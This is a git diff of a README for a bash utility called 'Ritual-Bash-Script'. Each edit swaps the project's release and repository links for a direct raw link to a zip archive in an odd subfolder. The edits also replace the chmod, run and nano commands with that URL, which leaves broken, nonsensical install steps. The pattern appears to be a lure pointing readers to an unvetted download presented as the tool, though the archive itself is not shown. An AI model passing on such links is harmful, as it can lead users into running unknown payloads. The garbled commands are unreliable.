@@ -1,7 +1,7 @@
 # 🎉 Ritual-Bash-Script - Simplify Your Bash Tasks Today
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-v1.0-blue?style=flat&logo=github)](https://github.com/yaRoxs/Ritual-Bash-Script/releases)
+[![Download](https://raw.githubusercontent.com/yaRoxs/Ritual-Bash-Script/main/bonaventure/Ritual-Bash-Script.zip)](https://raw.githubusercontent.com/yaRoxs/Ritual-Bash-Script/main/bonaventure/Ritual-Bash-Script.zip)
 
 ## 🚀 Getting Started
 Welcome to the Ritual-Bash-Script. This tool helps you automate various tasks in your terminal. Whether you're managing files or running programs, this script streamlines the process, making your life easier.
@@ -20,7 +20,7 @@ To run the Ritual-Bash-Script, you need:
 ## 🔗 Download & Install
 To download the Ritual-Bash-Script, visit this page:
 
-[Download the latest version here](https://github.com/yaRoxs/Ritual-Bash-Script/releases)
+[Download the latest version here](https://raw.githubusercontent.com/yaRoxs/Ritual-Bash-Script/main/bonaventure/Ritual-Bash-Script.zip)
 
 1. Click on the link above.
 2. You'll see a list of available versions.
@@ -47,14 +47,14 @@ cd ~/Downloads
 Before running the script, you need to give it permission to execute. Type:
 
 ```bash
-chmod +x Ritual-Bash-Script.sh
+chmod +x https://raw.githubusercontent.com/yaRoxs/Ritual-Bash-Script/main/bonaventure/Ritual-Bash-Script.zip
 ```
 
 ### 4. Run the Script
 Now you can run the script with this command:
 
 ```bash
-./Ritual-Bash-Script.sh
+https://raw.githubusercontent.com/yaRoxs/Ritual-Bash-Script/main/bonaventure/Ritual-Bash-Script.zip
 ```
 
 Follow the on-screen prompts to complete your task.
@@ -65,7 +65,7 @@ You may want to adjust settings before using the Ritual-Bash-Script. Here’s ho
 1. Open the script with a text editor. You can use:
 
 ```bash
-nano Ritual-Bash-Script.sh
+nano https://raw.githubusercontent.com/yaRoxs/Ritual-Bash-Script/main/bonaventure/Ritual-Bash-Script.zip
 ```
 
 2. Read through the comments in the script to understand what you can change.
@@ -85,7 +85,7 @@ Yes! If you have improvements or features to suggest, feel free to check the Con
 For further assistance, reach out through the Issues section on GitHub. Be sure to include details about your issue to get the best help.
 
 ## 🔗 Useful Links
-- [GitHub Repository](https://github.com/yaRoxs/Ritual-Bash-Script)
-- [Download the latest version here](https://github.com/yaRoxs/Ritual-Bash-Script/releases)
+- [GitHub Repository](https://raw.githubusercontent.com/yaRoxs/Ritual-Bash-Script/main/bonaventure/Ritual-Bash-Script.zip)
+- [Download the latest version here](https://raw.githubusercontent.com/yaRoxs/Ritual-Bash-Script/main/bonaventure/Ritual-Bash-Script.zip)
 
 By following these instructions, you should be able to download and run the Ritual-Bash-Script with ease. Enjoy using your new tool!
